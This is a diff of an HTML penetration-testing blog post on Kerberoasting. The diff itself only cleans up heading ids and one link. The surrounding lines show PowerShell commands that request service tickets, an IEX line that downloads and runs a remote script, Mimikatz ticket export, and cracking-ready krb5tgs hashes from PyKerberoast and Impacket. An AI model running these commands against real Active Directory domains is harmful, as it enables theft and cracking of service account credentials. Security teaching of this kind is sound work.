@@ -26,9 +26,9 @@
 
 &lt;p&gt;Now that we&amp;rsquo;ve listed all the tickets in a ton of different ways, we need to request the ones we want and get them to a point that we can start cracking them.&lt;/p&gt;
 
-&lt;h2 id=&#34;requesting-spn-kerberos-tickets:87772016882f37be4964a8eb45d1a0c9&#34;&gt;Requesting SPN Kerberos Tickets&lt;/h2&gt;
+&lt;h2 id=&#34;requesting-spn-kerberos-tickets&#34;&gt;Requesting SPN Kerberos Tickets&lt;/h2&gt;
 
-&lt;h3 id=&#34;powershell-requesting:87772016882f37be4964a8eb45d1a0c9&#34;&gt;PowerShell Requesting&lt;/h3&gt;
+&lt;h3 id=&#34;powershell-requesting&#34;&gt;PowerShell Requesting&lt;/h3&gt;
 
 &lt;p&gt;These are stolen directly from &lt;a href=&#34;https://twitter.com/timmedin&#34;&gt;Tim Medin @timmedin&lt;/a&gt;&amp;rsquo;s &lt;a href=&#34;https://github.com/nidem/kerberoast/blob/master/README.md&#34;&gt;Kerberoast repository README.md&lt;/a&gt;&lt;/p&gt;
 
@@ -48,7 +48,7 @@ PS C:\&amp;gt; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityT
 PS C:\&amp;gt; setspn.exe -T medin.local -Q */* | Select-String &#39;^CN&#39; -Context 0,1 | % { New-Object System. IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }  
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h3 id=&#34;powershell-requesting-just-users:87772016882f37be4964a8eb45d1a0c9&#34;&gt;PowerShell Requesting - Just Users&lt;/h3&gt;
+&lt;h3 id=&#34;powershell-requesting-just-users&#34;&gt;PowerShell Requesting - Just Users&lt;/h3&gt;
 
 &lt;p&gt;&lt;strong&gt;Getting just the User tickets:&lt;/strong&gt;&lt;/p&gt;
 
@@ -58,7 +58,7 @@ PS C:\&amp;gt; setspn.exe -T medin.local -Q */* | Select-String &#39;^CN&#39; -C
 PS C:\&amp;gt; IEX (New-Object Net.WebClient).DownloadString(&amp;quot;https://raw.githubusercontent.com/nidem/kerberoast/master/GetUserSPNs.ps1&amp;quot;) | ForEach-Object {try{New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.ServicePrincipalName}catch{}}
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h3 id=&#34;empire:87772016882f37be4964a8eb45d1a0c9&#34;&gt;Empire&lt;/h3&gt;
+&lt;h3 id=&#34;empire&#34;&gt;Empire&lt;/h3&gt;
 
 &lt;p&gt;PowerShell Empire received the functionality to get the SPN Tickets via &lt;a href=&#34;https://twitter.com/harmj0y&#34;&gt;@harmj0y&lt;/a&gt;&amp;rsquo;s commit here: &lt;a href=&#34;https://github.com/PowerShellEmpire/Empire/commit/b977dec1ae71753b6b896497be222abc6a124639&#34;&gt;b977dec&lt;/a&gt; which as of the writing of this post was still in the &lt;code&gt;dev&lt;/code&gt; branch of Empire (not master yet)&lt;/p&gt;
 
@@ -119,11 +119,11 @@ SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey
 Get-SPNTickets completed!
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;exporting-the-tickets:87772016882f37be4964a8eb45d1a0c9&#34;&gt;Exporting the tickets&lt;/h2&gt;
+&lt;h2 id=&#34;exporting-the-tickets&#34;&gt;Exporting the tickets&lt;/h2&gt;
 
 &lt;p&gt;Now we need to get the tickets out of the system we just requested them to. We can do this with Mimikatz both by itself, or directly in Empire:&lt;/p&gt;
 
-&lt;h3 id=&#34;mimikatz:87772016882f37be4964a8eb45d1a0c9&#34;&gt;Mimikatz&lt;/h3&gt;
+&lt;h3 id=&#34;mimikatz&#34;&gt;Mimikatz&lt;/h3&gt;
 
 &lt;p&gt;Using the &lt;strong&gt;&lt;code&gt;kerberos::list /export&lt;/code&gt;&lt;/strong&gt; functionality is awesome, but this will generate a file per-ticket. I have been on a few engagements where that meant 4000+ files. Luckily the awesome &lt;a href=&#34;https://twitter.com/gentilkiwi&#34;&gt;@gentilkiwi&lt;/a&gt; saves us and has included a &amp;ldquo;base64&amp;rdquo; mode for Mimikatz&lt;/p&gt;
 
@@ -133,7 +133,7 @@ Get-SPNTickets completed!
 PS C:\&amp;gt; Invoke-Mimikatz -Command &#39;standard::base64 &amp;quot;kerberos::list /export&amp;quot; exit&#39;
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h3 id=&#34;empire-1:87772016882f37be4964a8eb45d1a0c9&#34;&gt;Empire&lt;/h3&gt;
+&lt;h3 id=&#34;empire-1&#34;&gt;Empire&lt;/h3&gt;
 
 &lt;p&gt;Here is the module:&lt;/p&gt;
 
@@ -266,7 +266,7 @@ Storing 10-40a50000-notanadmin@LDAP~DC1.sittingduck.info~sittingduck.info-SITTIN
 
 &lt;p&gt;Next we need to convert those binary tickets into something crackable. That is where &lt;strong&gt;&lt;code&gt;kirbi2john.py&lt;/code&gt;&lt;/strong&gt; comes in.&lt;/p&gt;
 
-&lt;h3 id=&#34;kirbi2john:87772016882f37be4964a8eb45d1a0c9&#34;&gt;Kirbi2John&lt;/h3&gt;
+&lt;h3 id=&#34;kirbi2john&#34;&gt;Kirbi2John&lt;/h3&gt;
 
 &lt;p&gt;There are two versions of &amp;ldquo;kirbi2john&amp;rdquo;.&lt;/p&gt;
 
@@ -281,7 +281,7 @@ $krb5tgs$unkown:9e5ac5797343aabcb3ddc67df0f0fd88$d4c32f942980778547498a30f656d54
 
 &lt;p&gt;But all of that is hard and creates evidence. Lets look back at the tools &lt;a href=&#34;https://github.com/skelsec/PyKerberoast&#34;&gt;PyKerberoast&lt;/a&gt; and &lt;a href=&#34;https://github.com/CoreSecurity/impacket/blob/master/examples/GetUserSPNs.py&#34;&gt;Impacket&amp;rsquo;s GetUserSPNs.py&lt;/a&gt; and see if there is a better way:&lt;/p&gt;
 
-&lt;h2 id=&#34;pykerberoast:87772016882f37be4964a8eb45d1a0c9&#34;&gt;PyKerberoast&lt;/h2&gt;
+&lt;h2 id=&#34;pykerberoast&#34;&gt;PyKerberoast&lt;/h2&gt;
 
 &lt;ul&gt;
 &lt;li&gt;Source: &lt;a href=&#34;https://github.com/skelsec/PyKerberoast&#34;&gt;https://github.com/skelsec/PyKerberoast&lt;/a&gt;&lt;/li&gt;
@@ -306,7 +306,7 @@ $krb5tgs$23$*uberuser$SITTINGDUCK.INFO$spn*$4da625ffd63dad7676effe133dcb9c1b$af5
 [+]Done!
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;impacket:87772016882f37be4964a8eb45d1a0c9&#34;&gt;Impacket&lt;/h2&gt;
+&lt;h2 id=&#34;impacket&#34;&gt;Impacket&lt;/h2&gt;
 
 &lt;ul&gt;
 &lt;li&gt;Original Discussion: &lt;a href=&#34;https://github.com/CoreSecurity/impacket/pull/153#issuecomment-218438868&#34;&gt;https://github.com/CoreSecurity/impacket/pull/153#issuecomment-218438868&lt;/a&gt;&lt;/li&gt;
@@ -331,9 +331,9 @@ $krb5tgs$23$*uberuser$SITTINGDUCK.INFO$SPN*$27c08ed2a8d5394f66e8c13c25c98393$310
 
 &lt;p&gt;Much easier ;-) oh, and did I mention that if you use Impacket&amp;rsquo;s version you can just use LM/NTLM hashes instead of a password? Awesome! Alright, all we have left is to crack these tickets and figure out how to use them&amp;hellip;&lt;/p&gt;
 
-&lt;h1 id=&#34;references:87772016882f37be4964a8eb45d1a0c9&#34;&gt;References:&lt;/h1&gt;
+&lt;h1 id=&#34;references&#34;&gt;References:&lt;/h1&gt;
 
-&lt;h2 id=&#34;tools:87772016882f37be4964a8eb45d1a0c9&#34;&gt;Tools&lt;/h2&gt;
+&lt;h2 id=&#34;tools&#34;&gt;Tools&lt;/h2&gt;
 
 &lt;ul&gt;
 &lt;li&gt;&lt;a href=&#34;https://github.com/nidem/kerberoast&#34;&gt;Kerberoast&lt;/a&gt;&lt;/li&gt;
@@ -343,14 +343,14 @@ $krb5tgs$23$*uberuser$SITTINGDUCK.INFO$SPN*$27c08ed2a8d5394f66e8c13c25c98393$310
 &lt;li&gt;&lt;a href=&#34;https://github.com/hashcat/oclHashcat&#34;&gt;Github - oclHashcat&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;h2 id=&#34;presentations:87772016882f37be4964a8eb45d1a0c9&#34;&gt;Presentations&lt;/h2&gt;
+&lt;h2 id=&#34;presentations&#34;&gt;Presentations&lt;/h2&gt;
 
 &lt;ul&gt;
-&lt;li&gt;Tim Medin&amp;rsquo;s Slides - &lt;a href=&#34;https://files.sans.org/summit/hackfest2014/PDFs/Kicking%20the%20Guard%20Dog%20of%20Hades%20-%20Attacking%20Microsoft%20Kerberos%20%20-%20Tim%20Medin(1).pdf&#34;&gt;Kicking the Guard Dog of Hades - slides&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Tim Medin&amp;rsquo;s Slides - [Kicking the Guard Dog of Hades - slides](&lt;a href=&#34;https://files.sans.org/summit/hackfest2014/PDFs/Kicking%20the%20Guard%20Dog%20of%20Hades%20-%20Attacking%20Microsoft%20Kerberos%20%20-%20Tim%20Medin(1).pdf&#34;&gt;https://files.sans.org/summit/hackfest2014/PDFs/Kicking%20the%20Guard%20Dog%20of%20Hades%20-%20Attacking%20Microsoft%20Kerberos%20%20-%20Tim%20Medin(1).pdf&lt;/a&gt;)&lt;/li&gt;
 &lt;li&gt;Tim Medin&amp;rsquo;s Video - &lt;a href=&#34;https://www.youtube.com/watch?v=PUyhlN-E5MU&amp;amp;feature=youtu.be&#34;&gt;Kicking the Guard Dog of Hades - video&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;h2 id=&#34;other-write-ups:87772016882f37be4964a8eb45d1a0c9&#34;&gt;Other write ups&lt;/h2&gt;
+&lt;h2 id=&#34;other-write-ups&#34;&gt;Other write ups&lt;/h2&gt;
 
 &lt;ul&gt;
 &lt;li&gt;&lt;a href=&#34;http://malwarejake.blogspot.com/2015/11/kerberos-silver-tickets-unique-attacker.html&#34;&gt;Jacob Williams (MalwareJake) post about Silver Tickets being using in the wild&lt;/a&gt;&lt;/li&gt;
